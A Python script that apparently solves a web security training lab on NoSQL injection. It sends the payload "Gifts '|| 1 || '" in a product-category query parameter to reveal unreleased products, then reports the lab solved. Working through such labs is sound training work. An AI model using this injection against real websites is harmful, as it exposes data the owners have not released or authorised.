#######################################################################
#
# Lab: Detecting NoSQL injection
#
# Hack Steps: 
#      1. Inject payload into "category" query parameter to retrieve
#         unreleased products
#      2. Observe unreleased products in the response
#
#######################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aa400910383f84883c51e2200760063.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")

    payload = f"Gifts '|| 1 || '"

    try:  
        requests.get(f"{LAB_URL}/filter?category={payload}")
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.WHITE + "❯❯ Injecting payload to retrieve unreleased products.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()